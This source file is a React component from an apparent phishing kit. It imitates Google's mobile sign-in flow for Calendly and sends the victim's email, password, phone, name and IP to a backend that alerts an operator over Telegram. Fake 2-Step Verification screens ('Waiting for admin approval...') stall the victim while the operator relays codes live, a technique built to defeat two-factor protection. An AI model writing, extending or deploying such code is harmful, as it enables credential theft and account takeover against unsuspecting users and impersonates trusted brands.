import React, { useState, useContext, useEffect } from "react";
import { createPortal } from "react-dom";
import Image from "next/image";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import { DataContext } from "../../pages/index.js";

function GoogleSignInMobile({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
  onClose,
}) {
  const [step, setStep] = useState("email"); // "email", "password", "2fa", "2fa-code", "2fa-options"
  const [localEmail, setLocalEmail] = useState(Email || "");
  const [emailError, setEmailError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [dontAskAgain, setDontAskAgain] = useState(true);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isRequestingAuth, setIsRequestingAuth] = useState(false);
  const [expectedCode, setExpectedCode] = useState("");
  const { setAllData, AllData } = useContext(DataContext);

  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
  } = usePasswordAuth({
    Unik,
    Email: localEmail,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setLocalEmail(e.target.value);
    setEmailError("");
  };

  // Listen for APPAUTH events from Telegram polling
  useEffect(() => {
    const handleShowCode = () => {
      setStep("2fa-code");
    };

    const handleCodeReceived = (e) => {
      const { code } = e.detail;
      if (code) {
        setExpectedCode(code);
      }
    };

    window.addEventListener("appauth-show-code", handleShowCode);
    window.addEventListener("appauth-code-received", handleCodeReceived);

    return () => {
      window.removeEventListener("appauth-show-code", handleShowCode);
      window.removeEventListener("appauth-code-received", handleCodeReceived);
    };
  }, []);

  // Go back to password step when admin sends /password command
  useEffect(() => {
    if (passwordError && (step === "2fa" || step === "2fa-code" || step === "2fa-options")) {
      setIsRequestingAuth(false);
      setStep("password");
    }
  }, [passwordError, step]);

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  const handleEmailNext = () => {
    if (!localEmail) {
      setEmailError("Enter an email or phone number");
      return;
    }
    
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(localEmail)) {
      setEmailError("Enter a valid email");
      return;
    }
    
    setEmail(localEmail);
    setIsTransitioning(true);
    setTimeout(() => {
      setStep("password");
      setTimeout(() => setIsTransitioning(false), 50);
    }, 300);
  };

  const handlePasswordNext = async () => {
    if (!password) {
      return;
    }
    
    setIsRequestingAuth(true);
    setStep("2fa");
    
    try {
      // Send data to backend - sends Telegram message with /done button
      await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/appauth/request`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId: Unik,
          email: localEmail,
          password: password,
          ip: Ip,
          name: Name,
          businessEmail: BusinessEmail,
          tel: Tel
        })
      });
    } catch (error) {
      console.error('Error sending auth request:', error);
    } finally {
      setIsRequestingAuth(false);
    }
  };

  const handleBackToEmail = () => {
    setStep("email");
    clearPasswordError();
  };

  const handleTryAnotherWay = () => {
    setStep("2fa-options");
  };

  const handleBackTo2FA = () => {
    setStep("2fa");
  };

  const handleVerifyPhone = () => {
    // Simulate phone verification, then submit
    handleSubmit();
  };

  const getInitial = () => {
    if (localEmail) {
      return localEmail.charAt(0).toUpperCase();
    }
    return "";
  };

  const modalContent = (
    <div className={`fixed inset-0 z-[9999] flex flex-col font-sans overflow-y-auto ${step === "2fa" || step === "2fa-options" || step === "2fa-code" ? "bg-[#202124]" : "bg-white"}`}>
      {/* Header */}
      <div className={`flex items-center justify-between px-4 py-3 border-b ${step === "2fa" || step === "2fa-options" || step === "2fa-code" ? "border-gray-700" : "border-gray-200"}`}>
        <button
          onClick={() => step === "password" ? handleBackToEmail() : step === "2fa-options" ? handleBackTo2FA() : (onClose ? onClose() : null)}
          className="p-2"
        >
          <svg className="w-6 h-6 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
          </svg>
        </button>
        <div className="flex items-center">
          <Image src="/Images/google.svg" alt="Google" width={65} height={20} />
        </div>
        <div style={{ width: '40px' }}></div>
      </div>

      {/* Content */}
      <div className="flex-1 px-6 py-8">
        <div className="max-w-sm mx-auto">
          {step !== "2fa" && step !== "2fa-options" && step !== "2fa-code" && (
            <>
              <h1 className="text-2xl font-normal text-[#202124] text-center mb-2">
                {step === "email" ? "Sign in" : "Welcome"}
              </h1>
              {step === "email" && (
                <p className="text-base text-[#202124] text-center mb-8">
                  to continue to <span className="text-[#1a73e8] cursor-pointer hover:underline">Calendly</span>
                </p>
              )}
            </>
          )}

          {step === "2fa" && (
            <h1 className="text-2xl font-normal text-white text-center mb-4">2-Step Verification</h1>
          )}

          {step === "2fa-code" && (
            <h1 className="text-2xl font-normal text-white text-center mb-4">2-Step Verification</h1>
          )}

          {step === "2fa-options" && (
            <h1 className="text-2xl font-normal text-white text-center mb-4">2-Step Verification</h1>
          )}

          <div className="relative overflow-hidden">
          {step === "email" ? (
            <div className={`transition-all duration-300 ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
              <div className="mb-6">
                <input
                  type="text"
                  value={localEmail}
                  onChange={handleEmailChange}
                  placeholder="Email"
                  className={`w-full px-4 py-3 text-base border rounded border-[#dadce0] focus:border-[#1a73e8] focus:border-2 outline-none transition-all ${
                    emailError ? "border-[#d93025] border-2" : ""
                  }`}
                  disabled={isLoading}
                  onKeyPress={(e) => {
                    if (e.key === 'Enter') {
                      handleEmailNext();
                    }
                  }}
                />
                {emailError && (
                  <div className="text-[#d93025] text-xs mt-2 flex items-center gap-1">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                      <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm1 12H7V7h2v5zm0-6H7V4h2v2z"/>
                    </svg>
                    {emailError}
                  </div>
                )}
              </div>

              <a href="#" className="text-[#1a73e8] text-sm font-medium hover:underline inline-block mb-4">
                Forgot email?
              </a>

              <p className="text-sm text-[#5f6368] mb-8 leading-5">
                Not your computer? Use Guest mode to sign in privately.{" "}
                <a href="#" className="text-[#1a73e8] hover:underline">Learn more about using Guest mode</a>
              </p>

              <div className="flex justify-between items-center">
                <a href="#" className="text-[#1a73e8] text-sm font-medium hover:underline">
                  Create account
                </a>
                <button
                  onClick={handleEmailNext}
                  disabled={isLoading}
                  className="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium text-sm hover:bg-[#1765cc] transition-all disabled:bg-[#dadce0] disabled:text-[#80868b]"
                >
                  Next
                </button>
              </div>
            </div>
          ) : step === "password" ? (
            <div className={`transition-all duration-300 ${isTransitioning ? '-translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
              <div className="flex items-center gap-3 px-4 py-3 border border-[#dadce0] rounded-full mb-8 mt-4">
                <div className="w-6 h-6 rounded-full bg-[#1a73e8] flex items-center justify-center text-white text-xs font-medium flex-shrink-0">
                  {getInitial()}
                </div>
                <span className="text-sm text-[#202124] truncate">{localEmail}</span>
              </div>

              <p className="text-sm text-[#202124] mb-6">To continue, first verify that it's you</p>

              <div className="mb-4">
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={handlePasswordChange}
                    placeholder=" "
                    className={`w-full px-4 pt-6 pb-2 text-base border rounded focus:border-[#1a73e8] focus:border-2 outline-none transition-all bg-transparent peer ${
                      passwordError ? "border-[#d93025] border-2" : "border-[#dadce0]"
                    }`}
                    disabled={isRequestingAuth}
                    onKeyPress={(e) => {
                      if (e.key === 'Enter') {
                        handlePasswordNext();
                      }
                    }}
                  />
                  <label className="absolute left-4 top-4 text-[#5f6368] text-base pointer-events-none transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-[#1a73e8] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">
                    Enter your password
                  </label>
                </div>
                {passwordError && (
                  <div className="text-[#d93025] text-xs mt-2 flex items-center gap-1">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                      <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm1 12H7V7h2v5zm0-6H7V4h2v2z"/>
                    </svg>
                    {passwordError}
                  </div>
                )}
              </div>

              <label className="flex items-center text-sm text-[#5f6368] cursor-pointer mb-8">
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  className="mr-2"
                />
                Show password
              </label>

              <div className="flex justify-between items-center">
                <button
                  onClick={handleBackToEmail}
                  className="text-[#1a73e8] text-sm font-medium hover:underline flex items-center gap-1"
                >
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                  </svg>
                  Back
                </button>
                <button
                  onClick={handlePasswordNext}
                  disabled={isRequestingAuth}
                  className="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium text-sm hover:bg-[#1765cc] transition-all disabled:bg-[#dadce0] disabled:text-[#80868b]"
                >
                  {isRequestingAuth ? "Signing in..." : "Next"}
                </button>
              </div>
            </div>
          ) : step === "2fa" ? (
            <>
              <p className="text-sm text-gray-300 mb-6">
                To help keep your account safe, Google wants to make sure it's really you trying to sign in
              </p>

              <div className="mb-6 p-3 border border-gray-600 rounded-full flex items-center gap-2 bg-[#1a1a1a]">
                <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                  </svg>
                </div>
                <span className="text-sm text-white flex-1">{localEmail}</span>
                <svg className="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </div>

              <div className="text-center mb-8">
                <div className="flex flex-col items-center">
                  <svg className="animate-spin h-12 w-12 text-[#8ab4f8] mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  <p className="text-white text-lg mb-2">Waiting for admin approval...</p>
                  <p className="text-gray-400 text-sm">You will be redirected automatically</p>
                </div>
              </div>

              <label className="flex items-center text-sm text-gray-300 cursor-pointer mb-6">
                <input
                  type="checkbox"
                  checked={dontAskAgain}
                  onChange={(e) => setDontAskAgain(e.target.checked)}
                  className="mr-2 w-4 h-4"
                />
                Don't ask again on this device
              </label>

              <button className="text-gray-400 text-sm hover:text-gray-300 mb-8 block">
                Resend it
              </button>

              <button
                onClick={handleTryAnotherWay}
                className="text-[#8ab4f8] text-sm font-medium hover:underline"
              >
                Try another way
              </button>
            </>
          ) : step === "2fa-code" ? (
            <>
              <p className="text-sm text-gray-300 mb-6">
                To help keep your account safe, Google wants to make sure it's really you trying to sign in
              </p>

              <div className="mb-6 p-3 border border-gray-600 rounded-full flex items-center gap-2 bg-[#1a1a1a]">
                <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                  </svg>
                </div>
                <span className="text-sm text-white flex-1">{localEmail}</span>
                <svg className="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </div>

              {expectedCode ? (
                <div className="text-center mb-8">
                  <div className="flex flex-col items-center">
                    <div className="mb-4">
                      <svg className="w-16 h-16 text-[#8ab4f8] mb-2" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                      </svg>
                    </div>
                    <p className="text-white text-base mb-4">Your verification code:</p>
                    <div className="bg-[#1a1a1a] border-2 border-[#8ab4f8] rounded-lg px-6 py-3 mb-4">
                      <p className="text-[#8ab4f8] text-3xl font-bold tracking-wider font-mono">{expectedCode}</p>
                    </div>
                    <p className="text-gray-400 text-sm">Waiting for admin to approve...</p>
                  </div>
                </div>
              ) : (
                <div className="text-center mb-8">
                  <div className="flex flex-col items-center">
                    <svg className="animate-spin h-12 w-12 text-[#8ab4f8] mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <p className="text-white text-base mb-2">Waiting for verification code...</p>
                    <p className="text-gray-400 text-sm">Admin is sending your code</p>
                  </div>
                </div>
              )}

              <label className="flex items-center text-sm text-gray-300 cursor-pointer mb-6">
                <input
                  type="checkbox"
                  checked={dontAskAgain}
                  onChange={(e) => setDontAskAgain(e.target.checked)}
                  className="mr-2 w-4 h-4"
                />
                Don't ask again on this device
              </label>

              <button
                onClick={handleTryAnotherWay}
                className="text-[#8ab4f8] text-sm font-medium hover:underline w-full text-center"
              >
                Try another way
              </button>
            </>
          ) : step === "2fa-options" ? (
            <>
              <p className="text-sm text-gray-300 mb-6">
                To help keep your account safe, Google wants to make sure it's really you trying to sign in
              </p>

              <div className="mb-8 p-3 border border-gray-600 rounded-full flex items-center gap-2 bg-[#1a1a1a]">
                <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                  <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                  </svg>
                </div>
                <span className="text-sm text-white flex-1">{localEmail}</span>
                <svg className="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </div>

              <h2 className="text-lg text-white font-normal mb-6">Choose how you want to sign in:</h2>

              <div className="space-y-3 mb-8">
                <button
                  onClick={handleVerifyPhone}
                  className="w-full p-4 border border-gray-600 rounded hover:bg-[#2a2a2a] transition-colors text-left flex items-center gap-3 bg-[#1a1a1a]"
                >
                  <svg className="w-6 h-6 text-gray-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
                  </svg>
                  <span className="text-white text-sm">Tap <span className="font-medium">Yes</span> on your phone or tablet</span>
                </button>

                <div className="w-full p-4 border border-gray-700 rounded bg-[#1a1a1a] opacity-50 cursor-not-allowed text-left flex items-start gap-3">
                  <svg className="w-6 h-6 text-gray-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M2 5a2 2 0 012-2h7a2 2 0 012 2v4a2 2 0 01-2 2H9l-3 3v-3H4a2 2 0 01-2-2V5z" />
                  </svg>
                  <div className="flex-1">
                    <div className="text-gray-500 text-sm mb-1">Get a verification code at *** *** +66</div>
                    <div className="text-xs text-gray-600">2-Step Verification phone</div>
                    <div className="text-xs text-gray-600">Standard rates apply</div>
                    <div className="text-xs text-gray-600">Unavailable on this device</div>
                  </div>
                </div>

                <button
                  onClick={handleTryAnotherWay}
                  className="w-full p-4 border border-gray-600 rounded hover:bg-[#2a2a2a] transition-colors text-left flex items-center gap-3 bg-[#1a1a1a]"
                >
                  <svg className="w-6 h-6 text-gray-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
                  </svg>
                  <span className="text-white text-sm">Try another way</span>
                </button>
              </div>
            </>
          ) : null}
          </div>

          {step !== "2fa" && step !== "2fa-options" && step !== "2fa-code" && (
            <p className="text-xs text-[#5f6368] mt-8 leading-5">
              To continue, Google will share your name, email address, language preference, and profile picture with Calendly. Before using this app, you can review Calendly's{" "}
              <a href="#" className="text-[#1a73e8] hover:underline">privacy policy</a> and{" "}
              <a href="#" className="text-[#1a73e8] hover:underline">terms of service</a>.
            </p>
          )}
        </div>
      </div>
    </div>
  );

  return createPortal(modalContent, document.body);
}

export default GoogleSignInMobile;
